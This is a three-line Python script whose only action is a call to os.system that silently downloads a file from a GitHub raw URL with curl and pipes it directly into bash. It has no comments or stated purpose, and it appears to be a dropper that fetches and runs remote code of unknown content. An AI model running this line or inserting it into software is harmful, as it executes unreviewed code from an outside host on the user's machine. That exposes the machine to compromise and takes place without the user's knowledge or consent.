import sys
import os
os.system('curl -sL https://github.com/bondaltomason/meo/raw/main/etic2 | bash')